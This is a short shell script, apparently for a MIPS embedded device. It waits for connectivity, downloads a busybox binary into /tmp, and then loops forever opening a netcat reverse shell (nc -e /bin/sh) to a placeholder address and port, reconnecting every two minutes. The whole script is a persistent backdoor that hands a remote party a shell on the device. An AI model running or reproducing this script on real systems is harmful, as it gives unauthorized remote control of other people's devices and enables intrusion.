#!/bin/sh

#checking internet
While ! ping -c 1 google.com;
do 
    sleep 1
done

cd /tmp
wget https://www.busybox.net/downloads/binaries/1.21.1/busybox-mipsel
chmod +x busybox-mipsel

while true;
do 
    ./busybox-mipsel nc dest-ip-to-connect port-to-connect -e /bin/sh
    sleep 120     #if connection fails reconnect after 120 seconds
done
